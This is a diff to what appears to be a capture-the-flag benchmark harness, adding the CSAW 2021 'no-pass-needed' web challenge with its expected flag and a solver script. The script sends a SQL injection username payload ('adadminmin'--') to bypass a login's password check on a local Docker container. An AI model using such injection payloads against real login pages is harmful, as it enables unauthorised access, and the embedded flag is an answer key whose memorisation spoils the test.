@@ -443,6 +443,71 @@ else:
     raise RuntimeError(f"orangev2 endpoint did not become ready: {last}")
 """,
     ),
+    "2021q-web-no_pass_needed": ChallengeSpec(
+        challenge_id="2021q-web-no_pass_needed",
+        rel=Path("test/2021/CSAW-Quals/web/no-pass-needed"),
+        port=3000,
+        probe_path="/login",
+        expected_flag="flag{wh0_n3ed5_a_p4ssw0rd_anyw4y}",
+        note="username SQL injection bypasses password check",
+        split="test",
+        exploit_timeout=20.0,
+        target_host="web.chal.csaw.io",
+        compose_service="game-server",
+        exploit_script=r"""
+import os
+import subprocess
+import time
+import urllib.parse
+import urllib.request
+from http.cookiejar import CookieJar
+from pathlib import Path
+
+challenge_dir = Path(os.environ["LOTUS_CHALLENGE_DIR"])
+service = os.environ["LOTUS_COMPOSE_SERVICE"]
+cid = subprocess.check_output(
+    ["docker", "compose", "ps", "-q", service],
+    cwd=challenge_dir,
+    text=True,
+).strip()
+if not cid:
+    raise RuntimeError(f"compose service {service!r} has no running container")
+ip = subprocess.check_output(
+    ["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", cid],
+    text=True,
+).strip()
+if not ip:
+    raise RuntimeError(f"container {cid[:12]} has no Docker network IP")
+
+base = f"http://{ip}:{os.environ['LOTUS_TARGET_PORT']}"
+jar = CookieJar()
+opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
+last = None
+for _ in range(20):
+    try:
+        opener.open(f"{base}/login", timeout=3).read()
+        break
+    except Exception as e:
+        last = e
+    time.sleep(1)
+else:
+    raise RuntimeError(f"login endpoint did not become ready: {last}")
+
+payload = urllib.parse.urlencode({
+    "username": "adadminmin'--",
+    "password": "x",
+}).encode()
+req = urllib.request.Request(
+    f"{base}/login",
+    data=payload,
+    headers={"Content-Type": "application/x-www-form-urlencoded"},
+    method="POST",
+)
+opener.open(req, timeout=5).read()
+with opener.open(f"{base}/home", timeout=5) as r:
+    print(r.read().decode("utf-8", "replace"))
+""",
+    ),
 }
 
 
